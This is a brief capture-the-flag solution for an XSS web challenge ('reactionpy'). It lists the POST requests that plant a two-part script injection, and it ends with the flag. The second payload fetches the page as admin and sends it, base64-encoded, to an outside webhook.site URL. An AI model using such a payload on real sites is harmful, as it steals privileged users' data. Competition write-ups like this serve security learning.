**Challenge:** https://reactionpy.2021.chall.actf.co/ | server.py

Reset: POST /reset 

Restart: POST name=welcome&cfg=a

Prepare the captcha: https://reactionpy.2021.chall.actf.co/

  Reset: POST /reset

  New post: POST /newcomp `name=freq&cfg=<script>/*`


  New post: POST /newcomp 
  ```
  name=text&cfg=**/;fetch(`/?fakeuser=admin`).then(function(a){a.text().then(function(b){window.location=`https://webhook.site/09a09682-ba52-4dfe-9e50-fd433a15fa14/?data=`%2bencodeURIComponent(btoa(b))})});//`
  ```

Submit the host with the catptcha previusly resolved: POST /contest.

**Flag:**  actf{two_part_xss_is_double_the_parts_of_one_part_xss};
